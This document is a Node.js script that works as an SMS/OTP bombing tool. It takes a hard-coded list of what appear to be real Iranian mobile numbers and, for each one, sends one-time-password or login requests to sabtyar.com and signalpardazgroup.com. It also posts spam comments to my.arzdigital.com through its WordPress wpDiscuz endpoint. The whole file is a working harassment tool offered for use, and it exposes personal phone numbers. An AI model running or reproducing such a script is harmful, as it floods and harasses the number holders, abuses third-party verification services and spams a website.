const axios = require('axios');
const FormData = require('form-data');

const numbers = [
    "09024855528",
    "09396713494",
    "09105159388",
    "09352454259",
    "09352418316",
    // "09909799525",
    // "09163179685",
    // "09371495096",
    // "09173137619",
    // "09334387004",
    // "09176195600",
    // "09129370105",
    // "09358906174",
    // "09132974838",
    // "09055158574",
    // "09132506292",
    // "09391844521",
    // "09105159388",
    // "09369656602",
    // "09168186398",
    // "09166194595",
    // "09388676115",
    // "09371283944",
    // "09308560020",
    // "09036189510"
];

let formDataForArz = {
    action: 'wpdAddComment',
    wc_comment: 'test',
    wc_name: 'test',
    submit: 'ارسال دیدگاه',
    wpdiscuz_unique_id: '0_0',
    wpd_comment_depth: 1,
    postId: 1524969,
}

function sendForSabtYar(number) {
    axios.get(`https://sabtyar.com/api/GetLoginMethod?username=${number}`)
        .then(res => {
            console.log('SABTYAR : success');
        }).catch(e => {
            console.log('SABTYAR : ERR');
            console.log(e);
        })
}

function sendForArzDigital(number) {
    const formData = new FormData();

    const object = {
        action: "wpdAddComment",
        wc_comment: "!",
        wc_name: "سلام سلام",
        wc_email: number,
        submit: "ارسال دیدگاه",
        wpdiscuz_unique_id: "0_0",
        wpd_comment_depth: 1,
        postId: 1522823
    };

    Object.entries(object).forEach(([key, value]) => {
        formData.append(key, value);
    })

    const data = axios({
        method: "post",
        url: 'https://my.arzdigital.com/wp-admin/admin-ajax.php',
        // url: "https://my.arzdigital.com/wp-admin/admin-ajax.php",
        data: formData,
        headers: { "Content-Type": "multipart/form-data" },
    }).then(res => {
        console.log('ARZ : success');
    }).catch(e => {
        console.log('ARZ : ERR');
    })
}

function sendForSignal(number) {
    axios.post('https://signalpardazgroup.com/service/signalUserManager@7.0.0/sendOneTimePass', { mobile: number })
        .then(res => {
            console.log('Signal : Success');
        }).catch(e => {
            console.log('Signal : Error');
        })
}

function sendAll(numbers) {
    numbers.forEach(n => {
        sendForArzDigital(n);
        sendForSabtYar(n);
        sendForSignal(n);
    })
}
sendAll(numbers)